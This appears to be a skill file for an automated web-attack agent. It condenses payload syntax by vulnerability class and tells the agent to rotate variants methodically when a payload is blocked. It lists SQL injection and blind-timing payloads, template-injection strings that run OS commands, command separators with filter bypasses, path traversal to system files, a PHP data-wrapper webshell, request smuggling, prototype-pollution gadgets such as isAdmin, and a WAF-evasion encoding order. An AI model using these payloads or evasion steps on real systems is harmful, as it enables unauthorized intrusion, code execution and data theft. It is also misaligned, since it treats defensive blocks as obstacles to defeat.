# skill: payload_grammar
title: Payload Grammar by Class (PayloadsAllTheThings distillation)
when: payload,bypass,encode,waf,filter,blocked,evade,variant,escape,injection

## OPERATING PRINCIPLE
A blocked payload is a grammar problem, not a dead end. Every vuln class has
a payload lattice: syntax variants, encoding layers, comment chaos. Rotate
through the lattice methodically — one axis at a time.

## SQLi LATTICE (sqli_union_dump / sqli_blind_extract prep)
- Quote exit: `'` — `"`) — `')` — `"))` — backslash escape of preceding quote
- Comment: `-- ` — `#` — `/**/` inline — `%00`
- Space: `%20` — `+` — `/**/` — `%09` tab — parentheses no-space stacking
- Case/evasion: `SeLeCt`, inline comments mid-keyword `UN/**/ION`
- UNION width probe: NULLs stacked to 1..N columns; find text column by echo
- Blind timing: `AND IF(1=1,SLEEP(2),0)` → pg `pg_sleep` → mssql `WAITFOR DELAY`
- Error-oracle: `' AND CAST((SELECT version()) AS INT)--` (pg), extractvalue/exp (mysql)
- dbms fingerprint order: mysql(error quotes, LIMIT syntax) → postgres(::cast, $$) → mssql([brackets], WAITFOR) → sqlite(version()||'x', no INFORMATION_SCHEMA in old)

## SSTI LADDER (ssti_detect_rce — engine fingerprint BEFORE payload)
- probe: `${7*7}` — `{{7*7}}` — `<%= 7*7 %>` — `#{7*7}` — `{7*7}` → 49 tells engine
- jinja2: `{{config}}` → `{{ ''.__class__.__mro__[1].__subclasses__() }}` →
  `{{ lipsum.__globals__['os'].popen('id').read() }}`
- twig: `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`
- freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- velocity: `#set($x='')##$x.class.forName('java.lang.Runtime')...`
- smarty: `{system('id')}` / `{Smarty_Internal_Write_File::writeFile(...)}`
- mako: `${__import__("os").popen("id").read()}`

## COMMAND SEPARATORS (cmd_exec_probe — os_flavor decides)
- unix: `;` — `|` — `&&` — `\n` (%0a) — `$()` subshell — backticks — `||`
- windows: `&` — `&&` — `|` — `||` — `\n` — `& cls &`
- blind echo-marker: wrap output `;echo M1;CMD;echo M2;` (our marker contract)
- space filter: `$IFS`, `${IFS}`, brace expansion `{cmd,arg}`, `$IFS$9`

## PATH TRAVERSAL LADDER (lfi_file_read internals)
- depth: `../` × 4-16 — absolute `/etc/passwd` — current-dir `.//..//`
- encodings: `..%2f` — `%2e%2e%2f` — `..%252f` (double) — `..\/` — `....//`
- null byte (legacy php<5.3): `%00.txt`
- php wrappers: `php://filter/convert.base64-encode/resource=FILE` —
  `data://text/plain,<?php system($_GET[c]);?>` — `expect://id`
- file markers: root:, USER=, [boot loader] (win.ini) — no false positives

## SMUGGLING/TIMING (smuggle_probe internals)
- CL.TE body: `0\r\n\r\nX` (13 declared, chunked real end) — TE.CL: early `0` chunk
- TE.TE obfuscation: space before colon, `Transfer-Encoding: xchunked`, tab, casing
- delay read after smuggle: follower inherits prefix = desync confirmed

## PROTOTYPE POLLUTION SET (proto_pollute internals)
- `__proto__[k]=v` — `constructor[prototype][k]=v` — `__proto__.k=v`
- JSON: `{"__proto__":{"k":"v"}}` — nested merge — `{"constructor":{"prototype":{...}}}`
- gadget properties to plant: `status`, `isAdmin`, `role`, `body`, `exposedHeaders`
- canary: unique marker key, verify leak on unrelated endpoint

## ENCODING STACK ORDER when WAF blocks (waf_detect tells you which)
plain → url-encode → double-encode → unicode escapes → case rotation →
comment insertion → chunked transfer → parameter pollution (HPP: k=v&k=payload)
